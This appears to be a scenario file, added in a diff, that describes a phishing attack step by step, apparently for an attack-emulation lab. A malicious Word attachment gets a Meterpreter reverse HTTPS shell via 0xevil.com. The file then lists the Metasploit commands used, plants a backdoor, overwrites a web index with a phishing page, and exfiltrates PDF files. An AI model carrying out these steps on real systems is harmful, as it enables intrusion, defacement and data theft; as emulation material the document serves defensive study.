@@ -1,0 +1,32 @@
+Attack high-level description:
+The user logs in to Gmail, open the malicious email, with a malicious word file attachment. The user download and open the attached word file using a vulnerable Microsoft Word program. Word process connect back to 0xevil.com:8888, to fetch and inject meterpreter HTTPS payload to winword.exe process. The user use the gained access to gather information and to drop additional payload to the system (payload.exe). The malicious payload sweeps the system to collect high-profile PDF files, then it opens a HTTPS connection to 0xevil:8080 to exfiltrate the pdf files.
+
+Attack steps and commands:
+1- Start Metasploit exploit:
+use exploit/windows/fileformat/office_word_hta
+exploit
+set payload windows/meterpreter/reverse_https
+use exploit/multi/handler
+exploit
+
+2- Send the phishing email to the target.
+3- The user download the malicious word file, and the attacker gets a remote shell.
+
+4- Attacker performs the following shell commands using meterpreter shell and Windows console (i.e., cmd.exe):
+pwd (to show the current directory)
+ps (to list the active processes)
+ipconfig (to list the IP information)
+shell (spawn a shell (i.e., cmd.exe))
+> netstat -a
+> exit
+cd ../../../../.. (traverse back to C:\ drive)
+cd Users/admin
+ls (list the files)
+upload payload.exe (upload a backdoor)
+cat index.html (view the original web portal index)
+upload index.html (overwrite the web index with the phishing webpage)
+shell
+> payload.exe (run the payload to exfiltrate pdf files)
+> exit (kill the shell process)
+
+5 - The attacker receive the pdf files using the exfiltration server, which dedicate a folder per host to store the files.
